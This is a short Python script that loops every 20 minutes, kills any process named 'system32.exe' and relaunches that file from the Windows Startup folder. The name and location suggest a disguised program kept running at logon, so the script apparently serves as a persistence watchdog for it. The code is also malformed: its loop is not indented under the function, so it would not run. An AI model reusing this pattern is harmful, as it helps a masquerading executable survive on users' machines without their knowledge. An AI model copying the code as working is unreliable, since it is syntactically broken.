import psutil
import os
import time

def process():
while True:
    time.sleep(1200)
    for p in psutil.process_iter(attrs=['name']):
        if "system32.exe" in (p.info['name']).lower():
            os.system("taskkill /IM system32.exe /F")
            time.sleep(20)
            os.system('"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\system32.exe"')
process()
